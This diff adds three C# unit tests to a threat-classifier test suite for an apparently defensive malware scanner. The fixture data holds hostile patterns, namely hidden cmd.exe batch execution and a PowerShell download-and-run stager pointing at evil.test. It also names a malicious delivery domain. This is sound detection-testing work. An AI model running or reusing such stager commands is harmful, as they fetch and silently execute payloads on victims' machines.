@@ -276,4 +276,87 @@ public class ThreatDispositionClassifierTests
         result.RelatedFindings.Should().ContainSingle().Which.Should().BeSameAs(finding);
         result.BlockingRecommended.Should().BeTrue();
     }
+
+    [Fact]
+    public void Classify_WithHiddenCmdTempBatchWithoutDataFlow_ReturnsSuspicious()
+    {
+        var classifier = new ThreatDispositionClassifier();
+        var findings = new[]
+        {
+            new ScanFinding("Malware.Loader.Awake:95", "Detected FromBase64String call which decodes base64 encrypted strings.", Severity.Low)
+            {
+                RuleId = "Base64Rule"
+            },
+            new ScanFinding(
+                "Malware.Loader.Awake:212",
+                "Detected Process.Start call which could execute arbitrary programs. Target: \"cmd.exe\". Arguments: /C \"%TEMP%/r.bat\" [Evasion: UseShellExecute=true, WindowStyle=Hidden, WorkingDirectory=Temp] [LOLBin with hidden execution (UseShellExecute, WindowStyle.Hidden, WorkingDirectory=Temp)]",
+                Severity.Critical)
+            {
+                RuleId = "ProcessStartRule"
+            },
+            new ScanFinding(
+                "Malware.Loader.Awake",
+                "High risk: Multiple suspicious patterns detected (process execution + Base64 decoding + file write)",
+                Severity.High)
+            {
+                RuleId = "MultiSignalDetection"
+            }
+        };
+
+        var result = classifier.Classify(findings, threatFamilies: null);
+
+        result.Classification.Should().Be(ThreatDispositionClassification.Suspicious);
+        result.RelatedFindings.Should().Contain(finding => finding.RuleId == "ProcessStartRule");
+        result.BlockingRecommended.Should().BeTrue();
+    }
+
+    [Fact]
+    public void Classify_WithEmbeddedResourceScriptStager_ReturnsSuspicious()
+    {
+        var classifier = new ThreatDispositionClassifier();
+        var finding = new ScanFinding(
+            "Embedded resource: noclip.KeyBind.Config",
+            "Referenced embedded resource 'noclip.KeyBind.Config' contains script execution with staged script payload markers.",
+            Severity.High)
+        {
+            RuleId = "EmbeddedResourceScriptRule",
+            CodeSnippet = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"DownloadFile('https://evil.test/a', '$env:TEMP\\test.bat'); & '$env:TEMP\\test.bat'\""
+        };
+
+        var result = classifier.Classify(new[] { finding }, threatFamilies: null);
+
+        result.Classification.Should().Be(ThreatDispositionClassification.Suspicious);
+        result.RelatedFindings.Should().ContainSingle().Which.Should().BeSameAs(finding);
+        result.BlockingRecommended.Should().BeTrue();
+    }
+
+    [Fact]
+    public void Classify_WithKnownInfrastructureDownloadAndHiddenStagedLaunch_ReturnsSuspicious()
+    {
+        var classifier = new ThreatDispositionClassifier();
+        var findings = new[]
+        {
+            new ScanFinding(
+                "System.Net.WebClient.DownloadFile:50",
+                "Read-only operation to known malicious domain (confirmed payload delivery infrastructure). URL(s): https://fingercakes4sale.store/OIlAL",
+                Severity.High)
+            {
+                RuleId = "DataInfiltrationRule"
+            },
+            new ScanFinding(
+                "Malware.Loader.Stage:95",
+                "Detected Process.Start call which could execute arbitrary programs. Target: \"t.bat\". Arguments: <unknown/no-arguments> [Evasion: CreateNoWindow=true, WindowStyle=Hidden] [Hidden process execution (CreateNoWindow, WindowStyle.Hidden)] Correlated data flow: Suspicious data flow: Downloads data from network, processes it, and executes as a program (3 operations).",
+                Severity.Critical)
+            {
+                RuleId = "ProcessStartRule"
+            }
+        };
+
+        var result = classifier.Classify(findings, threatFamilies: null);
+
+        result.Classification.Should().Be(ThreatDispositionClassification.Suspicious);
+        result.RelatedFindings.Should().Contain(finding => finding.RuleId == "DataInfiltrationRule");
+        result.RelatedFindings.Should().Contain(finding => finding.RuleId == "ProcessStartRule");
+        result.BlockingRecommended.Should().BeTrue();
+    }
 }
